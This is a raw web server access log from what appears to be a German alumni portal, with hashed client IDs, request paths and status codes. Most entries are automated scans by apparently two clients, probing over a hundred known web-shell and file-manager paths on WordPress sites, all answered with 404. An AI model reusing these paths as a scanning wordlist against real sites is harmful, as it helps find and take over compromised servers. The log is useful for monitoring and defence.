0b57ad9a6d6970f203980b6671c04968781a38c6a5ea6233e9126ea62b28c83a;2025-11-20 17:07:01;;/ww5.php;GET;404
0b57ad9a6d6970f203980b6671c04968781a38c6a5ea6233e9126ea62b28c83a;2025-11-20 17:07:02;;/thxt.php;GET;404
0b57ad9a6d6970f203980b6671c04968781a38c6a5ea6233e9126ea62b28c83a;2025-11-20 17:07:03;;/kairolin.php;GET;404
0b57ad9a6d6970f203980b6671c04968781a38c6a5ea6233e9126ea62b28c83a;2025-11-20 17:07:04;;/siln.php;GET;404
61b5ba957f8f9295b2b58bc439f23e666f738c406608756e4335dd2d0528c631;2025-11-20 17:10:47;;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-20 17:15:58;/gruppen/interesse/kommunikationsfahigkeiten;/personen/alumni/details/heidi-burghard;GET;200
deecd6b1509b8a43d9860fe51feb9c208505299db9559fa7d994df69019cebae;2025-11-20 17:17:55;;/personen/alumni/schule/5504;GET;200
f67c2428f765716a7d9cef10f640e2303381af1953740481410da550f4bad41c;2025-11-20 17:29:54;;/themen?category=wissenschaft;GET;200
a0f4d2d3869c765a0ec69a8ba65f522de59824a47ad8dad613b39128bf494597;2025-11-20 17:34:55;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
4a2a3c1197a2d4e44ec95adb939f8adba1a37698ede2bd1d39177424a1f113e4;2025-11-20 17:41:16;;/personen/alumni/details/kai-ingo-heidbuchel;GET;200
e31e0da11aa9fe82128577fe5a95d87f4ae3158d7b3636766f9b3593c5ea045b;2025-11-20 17:44:48;;/personen/alumni/schule/4440012;GET;200
3d979e1f119081a0b070fd9354a1d009c3f801ab440f6c6971e52268cccb29da;2025-11-20 17:45:08;;/;GET;200
37cf17ee5d36816487ee8689973b1df54f8da441a57c505c09c6e30ff99dbb29;2025-11-20 17:45:08;;/;GET;200
37cf17ee5d36816487ee8689973b1df54f8da441a57c505c09c6e30ff99dbb29;2025-11-20 17:45:24;;/;GET;200
b8b5801e8723803ce7d771eb5f46cdf068214636eccd53cb120ee4c6e5677c37;2025-11-20 18:01:25;;/personen/alumni/schule/65286;GET;200
4f4ae1dc40209f18a5c0f9c23ae1f115c378ea6bffe77d891f99a43e679fc6e1;2025-11-20 18:01:38;;/;GET;200
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:03;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:03;;/class-t.api.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:03;;/zwso.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:03;;/wp-content/uploads/autoload_classmap.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:04;;/wp-content/plugins/dummyyummy/wp-signup.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:04;;/wp-admin/css/colors/blue/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:04;;/admin.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:05;;/mpvloi.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:05;;/wp-includes/0.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:05;;/randkeyword.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:05;;/fwe.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:05;;/wp-includes/cs.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:05;;/wikindex.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:05;;/images/m.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:05;;/wp-includes/css/kses.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:06;;/jagoan.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:06;;/images/g3.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:06;;/.well-known/zaza.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:06;;/htaccess.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:06;;/readme.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:06;;/Cok.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:06;;/hob.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:07;;/kal.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:07;;/fv.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:07;;/lx.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:07;;/w1w.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:07;;/Contrller.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:07;;/cafe.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:07;;/ww2.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:07;;/ww3.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:08;;/ww4.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:08;;/as.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:09;;/wsd.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:09;;/403.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:09;;/max.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:09;;/m.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:09;;/post.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:09;;/themes.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:09;;/wp-content/themes/astra/inc/ki1k.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:09;;/ALFA_DATA/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:09;;/wp-admin/maint/about.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:10;;/wp-admin/network/wp-conflg.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:10;;/click.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:10;;/install.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:10;;/lv.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:10;;/simple.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:10;;/13k.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:10;;/css.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:11;;/yellow.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:11;;/cong.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:11;;/fw.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:11;;/bs1.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:11;;/wp-includes/images/wp-login.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:11;;/termps.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:12;;/co.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:12;;/cong.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:12;;/atomlib.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:12;;/w.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:13;;/404.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:13;;/ioxi-o.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:13;;/wp-content/product.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:13;;/wp-content/function.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:13;;/0x.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:13;;/css.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:14;;/222.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:14;;/wp-content/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:14;;/1.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:14;;/admin.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:15;;/wp-admin/maint/maint.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:15;;/classwithtostring.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:15;;/abcd.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:15;;/dropdown.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:16;;/moon.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:16;;/0x.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:16;;/moon.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:16;;/autoload_classmap.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:16;;/inputs.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:16;;/default.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:16;;/fm.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:17;;/about.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:17;;/alfa.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:17;;/buy.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:17;;/themes/twentytwentytwo/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:18;;/wp-admin/js/wp-conflg.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:18;;/wp-admin/wp-conflg.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:18;;/wp-admin/css/wp-conflg.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:19;;/manager.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:19;;/js/fm.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:19;;/item.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:19;;/plugins/Cache/footer.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:19;;/404.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:20;;/mail.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:20;;/wp-content/plugins/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:20;;/sx.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:20;;/wp-admin/maint/admin.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:21;;/article.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:21;;/alfa.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:21;;/1.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:22;;/403.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:22;;/link.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:22;;/byp.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:22;;/ws.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:23;;/wp-trackback.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:23;;/.well-known/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:23;;/wp-includes/certificates/plugins.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:23;;/wp-content/themes/seotheme/mar.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:23;;/wp-admin/network/plugins.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:25;;/wp-admin/about.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:26;;/gmo.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:26;;/wp-includes/ID3/about.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:26;;/css/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:26;;/wp-admin/includes/xmrlpc.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:26;;/wp-includes/SimplePie/wp-login.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:27;;/wp-content/themes/about.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:27;;/filemanager/dialog.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:27;;/wp-admin/maint/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:27;;/wp-includes/Requests/Text/admin.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:27;;/wp-includes/customize/about.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:27;;/index/function.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:27;;/uploads/autoload_classmap.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:27;;/wp-includes/css/dist/preferences/wp-login.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:28;;/wp-includes/style-engine/about.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:28;;/ww1.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:28;;/qqq.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:28;;/about/function.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:28;;/wp-includes/theme-compat/chosen.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:28;;/admin/function.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:29;;/css/colors/blue/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:29;;/wp-content/plugins/pwnd/as.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:29;;/wp-admin/setup-config.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:29;;/wp-admin/user/about.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:30;;/wp-admin/js/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:30;;/wp-content/upgrade/about.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:30;;/wp-includes/assets/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:30;;/wp-content/radio.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:30;;/wp-includes/fonts/index.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:31;;/.well-known/gecko-litespeed.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:32;;/.well-known/admin.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:32;;/wp-content/admin.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:33;;/wp-content/plugins/admin.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:33;;/wp-content/themes/twentytwentytwo/index.php?p=;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:33;;/.well-known/log.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:33;;/class.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:33;;/bless.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:34;;/wp-includes/js/codemirror/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:34;;/wp-includes/block-patterns/index.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:34;;/lock360.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:34;;/bge.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:35;;/ifm.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:35;;/ww5.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:35;;/thxt.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:35;;/kairolin.php;GET;404
4ab9a89f39cfe84fcfd000188e9af1d5f2586a7595c21c93d63adb7bd3a363a9;2025-11-20 18:14:35;;/siln.php;GET;404
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-20 18:16:49;;/;GET;200
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-20 18:16:51;/;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-20 18:27:22;/gruppen/plausch/ai-driven-programme;/gruppen/hobby/sozialwissenschaften;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-20 18:27:22;/gruppen/plausch/ai-driven-programme;/gruppen;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-20 18:28:39;/gruppen/plausch/ai-driven-programme;/gruppen/hobby/geschichte;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-20 18:28:40;/gruppen/plausch/ai-driven-programme;/gruppen;GET;200
78c4692ae237c8e803c26b4dda0e5de07532dfbb0a1b746736bbb3b038a6e0a3;2025-11-20 18:28:44;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
9545c81adbb78868bd26f153d9525fce2cc6ac856f25454ca71af7b9addc0c75;2025-11-20 18:30:03;;/?page=docs-sql;GET;200
c97176dc56113749cb71066c95770778d5d25301ead5028357853f0c319bff41;2025-11-20 18:30:45;/Web/Auth;/Web/Auth;GET;404
2dd5d8b3c925cbbe76a42966fb048e3d6e79840264704550e477e8daeaca5ce4;2025-11-20 18:32:11;;/;GET;200
e31e0da11aa9fe82128577fe5a95d87f4ae3158d7b3636766f9b3593c5ea045b;2025-11-20 18:38:32;;/personen/alumni/schule/4340014;GET;200
8c1044df90448a4f1324f7c2170920c118528aa827b32f692174ec951b13a72d;2025-11-20 18:41:56;;/personen/alumni/details/felix-fischer;GET;200
6ca04099a0d612514779011a6c85df05740aa0f541385c233d7e8fd3bb69d50d;2025-11-20 18:44:20;;/aktuelles/meldungen?category=community;GET;200
2f171aebb9ec8fab84ffc23d9189d698cca5b00c8a00576827d6f4acac5a8909;2025-11-20 18:45:59;;/;GET;200
25ffaf69d2a65b2ea93756973e6f54a406f6f4ae601e1ca16d0326024fde38a7;2025-11-20 18:48:47;;/.well-known/traffic-advice;GET;404
8d795502ffd00509a92aa044a1f8120e07d5c740c9d81605e1ec0f9347ee77c4;2025-11-20 18:48:47;/;/personen/alumni/schule/5505;GET;200
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:09;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:11;;/class-t.api.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:12;;/zwso.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:13;;/wp-content/uploads/autoload_classmap.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:14;;/wp-content/plugins/dummyyummy/wp-signup.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:15;;/wp-admin/css/colors/blue/index.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:16;;/admin.php?p=;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:17;;/mpvloi.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:18;;/wp-includes/0.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:19;;/randkeyword.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:19;;/fwe.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:20;;/wp-includes/cs.php;GET;404
55b47484a74fdf951536675da6c47916942ec6be0783622e3fccc5c9cc293b19;2025-11-20 18:49:22;;/wikindex.php;GET;404
